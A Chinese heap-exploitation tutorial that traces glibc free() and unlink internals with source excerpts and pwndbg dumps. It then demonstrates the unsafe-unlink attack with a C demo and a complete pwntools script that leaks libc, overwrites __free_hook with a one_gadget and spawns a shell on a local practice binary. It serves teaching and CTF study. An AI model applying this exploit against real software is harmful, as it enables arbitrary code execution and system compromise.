&emsp;&emsp;<font size=2>看到这了我就假设你已经看过我的malloc四部曲和free了，接下来我们将利用这些利用技巧来更深层次的理解内存管理。首先还是从简单的入手，假设有如下代码：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
        void *p1,*p2;

        p1=malloc(0x100);
        p2=malloc(0x100);
        malloc(0x20);

        free(p1);
        free(p2);

        return 0;
}

```

&emsp;&emsp;<font size=2>为什么要`malloc(0x20);`？之前我们分析过，如果下一个堆块是top，那么free这个p2的时候就会发生和top堆合并的情况，但我们不让这种情况发生，所以随便垫一个堆块上去隔离掉top。malloc的情况我们已经分析过了，还记得`goto use_top;`吗？所以我们直接看在堆块不靠着top的情况下`free(p1);`发生了什么：</font></br>

```C
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      //...
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* see if the dynamic brk/mmap threshold needs adjusting */
      //...
    }

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);
}

```

&emsp;&emsp;<font size=2>调用\_int_free，很熟悉，ar_ptr为main_arena，p指向了chunk头，看_int_free，跳过一些重复分析过的东西，控制流到了这里：</font></br>

```C
    /* consolidate backward */
    if (!prev_inuse(p)) {
      //...
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        //...
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);
```

&emsp;&emsp;<font size=2>显然我们free的堆块是堆区最上面的第一个堆块，因此prev_inuse不可能为0，也就不可能consolidate backward了。然后检查了nextchunk是不是top chunk，在我们的情况下不是，因此进入第二个if中执行，相关宏定义如下：</font></br>

```C
#define inuse_bit_at_offset(p, s)                                             \
  (((mchunkptr) (((char *) (p)) + (s)))->size & PREV_INUSE)
#define clear_inuse_bit_at_offset(p, s)                                       \
  (((mchunkptr) (((char *) (p)) + (s)))->size &= ~(PREV_INUSE))
#define PREV_INUSE 0x1
```

&emsp;&emsp;<font size=2>nextinuse就是0x20堆块的prev_inuse位，显然为1，因此不满足if条件，进入到了else，情况了nextchunk（第二个0x100堆块）的prev_inuse位，size变为了0x110。继续往下看：</font></br>

```C
#define set_head(p, s)       ((p)->size = (s))
#define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))

      /*
        Place the chunk in unsorted chunk list. Chunks are
        not placed into regular bins until after they have
        been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          //...
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
    else {
      //...
    }
```

&emsp;&emsp;<font size=2>先检查unsorted bin链表状态，相当于`bin->fd->bk==bin`。然后在p（我们释放的堆块）的fd和bk地址处放上unsotedbin的fd和bk处的值，第一次释放的话就是unsortedbin在main_arena的地址，设置完了后main_arena中的unsortedbin的fd和bk也要修改为p的地址。因为这个堆块的释放，下一个堆块的pre_size就得设置为此堆块的大小以备下次合并的时候读取用。这一系列操作结束后堆块情况如下：</font></br>

```
pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000111
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg> 
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0:	0x0000000000000000	0x0000000000000000
0x6020f0:	0x0000000000000000	0x0000000000000000
0x602100:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000110	0x0000000000000110
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
pwndbg> p main_arena
$2 = {
  mutex = 0, 
  flags = 1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x602250, 
  last_remainder = 0x0, 
  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...}, 
  binmap = {0, 0, 0, 0}, 
  next = 0x7ffff7dd1b20 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 1, 
  system_mem = 135168, 
  max_system_mem = 135168
}
pwndbg> x/20xg & main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602250
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000602000
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602000	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
pwndbg> 

```

&emsp;&emsp;<font size=2>因此与合并到top不同的是，这一次会设置p和main_arena的fd和bk，还会设置下一个堆块的prev_inuse标志位和pre_size。</font></br>

&emsp;&emsp;<font size=2>分析完了第一个free之后我们来分析第二个free，这个才是重点，与之前不同的是，控制流会到达这里：</font></br>

```C
#define prev_inuse(p)       ((p)->size & PREV_INUSE)
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

&emsp;&emsp;<font size=2>此时size为两个将被合并的堆块的size之和，p被设置到了上一个堆块，也就是准备unlink合并的堆块，而unlink就是最关键的一个宏，也是本节的核心：</font></br>

```C
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                                               \
    BK = P->bk;                                                               \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                                                    \
        FD->bk = BK;                                                          \
        BK->fd = FD;                                                          \
        if (!in_smallbin_range (P->size)                                      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
            //...                                                            \
          }                                                                   \
      }                                                                       \
}

```

&emsp;&emsp;<font size=2>第一个被释放的smallbin P是unsortedbin list中唯一一个堆块，其fd和bk为unsortedbin在main_arena的地址，被赋给了FD和BK。然后对这个unsortedbin list有一个检查。按照我们之前分析的，FD->bk和BK->fd都为P的地址，因此检查不会触发错误，继续往下看，又重新将unsotedbin list中的fd和bk置位为了其在main_arena地址，然后unlink宏就结束了。其相当于执行了：</font></br>

```C
P->fd->bk=P->bk;
P->bk->fd=P->fd;
//非常经典的链表脱钩算法，记住这一个操作！
```

&emsp;&emsp;<font size=2>完成unlink后的main_arena状态如下（但还没结束！），可以看到(main_arena+88)处的fd，bk被更改了：</font></br>

```
pwndbg> p main_arena
$5 = {
  mutex = 1, 
  flags = 1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x602250, 
  last_remainder = 0x0, 
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...}, 
```

&emsp;&emsp;<font size=2>_int_free剩下的代码就比较简单：</font></br>

```C
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        //...
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
```

&emsp;&emsp;<font size=2>清空了被free堆块下一个堆块的prev_inuse位，然后bck为main_arena的地址，fwd也是main_arena的地址。把被释放指针的fd和bk设置为了main_arena地址，又把main_arena中unsortedbin list的bk和fd设置为了p的地址，然后重新设置p堆块的size和下一个堆块的pre_size。最终效果如下：</font></br>

```
pwndbg> p main_arena
$6 = {
  mutex = 0, 
  flags = 1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x602250, 
  last_remainder = 0x0, 
  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...}, 


pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000221
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
..........
..........
0x602220:	0x0000000000000220	0x0000000000000030
0x602230:	0x0000000000000000	0x0000000000000000
0x602240:	0x0000000000000000	0x0000000000000000
0x602250:	0x0000000000000000	0x0000000000020db1
0x602260:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>那么对这个demo的分析完成了，接下来我们来介绍unsafe-unlink是怎么利用这个unlink宏达到攻击效果的。查看如下demo代码：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

unsigned long chunk_link[0x10];

int main()
{
	void *p1,*p2;
	unsigned long* ptr;

	p1=malloc(0x100);
	p2=malloc(0x100);
	malloc(0x20);

  //记录这些堆块
	chunk_link[0]=p1;
	chunk_link[1]=p2;

  //伪造fd和bk
	ptr=(unsigned long*)p1;
	*(ptr+2)=(unsigned long)&chunk_link[0]-0x18;
	*(ptr+3)=(unsigned long)&chunk_link[0]-0x10;

  //伪造pre_size并抹掉prev_inuse位
	ptr=(unsigned long*)p2;
	*(ptr-2)=0x100;
	*(ptr-1)=0x110;
  //unlink修改了chunk_link记录的堆块指针
	free(p2);

  //任意地址写
	read(0,chunk_link[0],0x20);
	read(0,chunk_link[0],0x20);

	return 0;
}
```

&emsp;&emsp;<font size=2>这是一段模拟了unsafe-unlink攻击导致可以任意地址写的代码，假如有一个读书笔记模拟程序，该程序可能通过malloc分配的堆块记录你写的笔记，然后你可以对你之前写的笔记重新进行修改（相当于之前分配的堆块），那么可能就会有一个全局变量保存了每个堆块的地址以方便下次进行写入读取。接下来我们开始我们的正片，伪造fd，bk后再伪造下一个堆块的pre_size和prev_inuse位！然后我们将跟踪`free(p2);`这个函数来分析unsafe-unlink是如何发生的，老样子，直接从_int_free的核心代码开始看起：</font></br>

```C
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

&emsp;&emsp;<font size=2>因为我们在`free(p2);`之前已经通过某种手段抹掉了其prev_inuse位，因此控制流会进入这一段if执行，得到其pre_size，并把其加到size上，然后设置p减去我们伪造的pre_size而到了一个假的，不是真正的堆块上，然后进行一个unlink宏：</font></br>

```C
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                                               \
    BK = P->bk;                                                               \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                                                    \
        FD->bk = BK;                                                          \
        BK->fd = FD;   
```

&emsp;&emsp;<font size=2>现在宏内部，P就是那个假的堆块（现在称其为我们伪造的堆块），唯一需要注意的就是对这个链表的一个检查：`FD->bk!=P || BK->fd!=P`，FD就是`P+0x10`的数据，我们伪造为了`&chunk_link[0]-0x18`，BK就是`P+0x18`里的数据，我们伪造为了`&chunk_link[0]-0x10`，而对其bk或者fd的访问同样也是一个加0x18或者0x10的偏移，因此想象一下这个检查：</font></br>

```C
*((&chunk_link[0]-0x18)+0x18)==P
*((&chunk_link[0]-0x10)+0x10)==P
```

&emsp;&emsp;<font size=2>效果岂不是相当于`chunk_link[0]==P`？而chunk_link[0]正是我们之前记录的堆块P（思考一下，为什么只能把堆块伪造在堆块头+0x10的位置，再往下就不行？），检查刚好被绕过了，然后再看一看我们之前分析得到的链表脱钩操作：</font></br>

```C
P->fd->bk=P->bk;
P->bk->fd=P->fd;
```

&emsp;&emsp;<font size=2>这个操作的效果如下：</font></br>

```C
chunk_link[0]=p-0x10;
chunk_link[0]=p-0x18;
```

&emsp;&emsp;<font size=2>free的后续代码不重要了，也就是说free函数结束后，chunk_link的内容变成了这样：</font></br>

```
0x601080 <chunk_link>:	0x0000000000601068	0x0000000000602120
0x601090 <chunk_link+16>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这个时候，程序还以为`chunk_link[0]`记录的仍然是第一个堆块的地址，然后其指向的地址却已修改为了chunk_link地址的前0x18个字节，因此在你使用"编辑以前的笔记"功能的时候，效果类似如下：</font></br>

```C
read(0,chunk_link[0],0x20);
```

&emsp;&emsp;<font size=2>往里写入一系列数据的时候会覆盖到我们的chunk_link，相当于chunk_link里有多少个堆块我们就可以任意写多少次。比如写0x20个'a'：</font></br>

```
pwndbg> x/20xg 0x601000
0x601000:	0x0000000000600e28	0x00007ffff7ffe168
0x601010:	0x00007ffff7dee870	0x00007ffff7a914f0
0x601020:	0x00007ffff7b04250	0x00007ffff7a2d740
0x601030:	0x00007ffff7a91130	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060 <completed.7594>:	0x0000000000000000	0x6161616161616161
0x601070:	0x6161616161616161	0x6161616161616161
0x601080 <chunk_link>:	0x6161616161616161	0x0000000000602120
0x601090 <chunk_link+16>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

&emsp;&emsp;<font size=2>再次使用"重新编辑笔记功能"，效果就等同于向0x6161616161616161地址处写入任意数据了，如果这个不是0x6161616161616161而是一些敏感的地址呢？比如\_\_malloc_hook？比如got表？getshell就变得非常简单了:D</font></br>

&emsp;&emsp;<font size=2>用我们的漏洞大礼包程序来试试getshell的话，利用pwntools脚本如下：</font></br>

```python
from pwn import *

p=process('./demo')

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Choice:'

def add(size,content=''):
    sla(menu,'1')
    sla('input your size:',str(size))
    sla('input your message:',content)

def delete(index):
    sla(menu,'2')
    sla('input the index: ',str(index))

def edit(index,content):
    sla(menu,'3')
    sla('input the index: ',str(index))
    sla('input your content:',content)

def show(index):
    sla(menu,'4')
    sla('input the index: ',str(index))

chunk_link=0x6020c0

#=========================
# leak libc_base

add(0x100)
add(0x100)
delete(0)
show(0)
rv('content:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
success("libc base:"+hex(libc_base))
delete(1)

#===================================
# now exploit
add(0x100)      #2
add(0x100)      #3
add(0x20)       #4

# fake the fd and bk to chunk_link
payload=p64(0)*2+p64(chunk_link-0x18)+p64(chunk_link-0x10)
payload=payload.ljust(0x100,'a')

#edit nextchunk's pre_size and prev_inuse
payload+=p64(0x100)+p64(0x110)
edit(2,payload)

delete(3)
edit(0,'a'*0x18+p64(libc_base+0x3c67a8))
edit(0,p64(libc_base+0x4526A))
#gdb.attach(p)

delete(4)

p.interactive()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

```

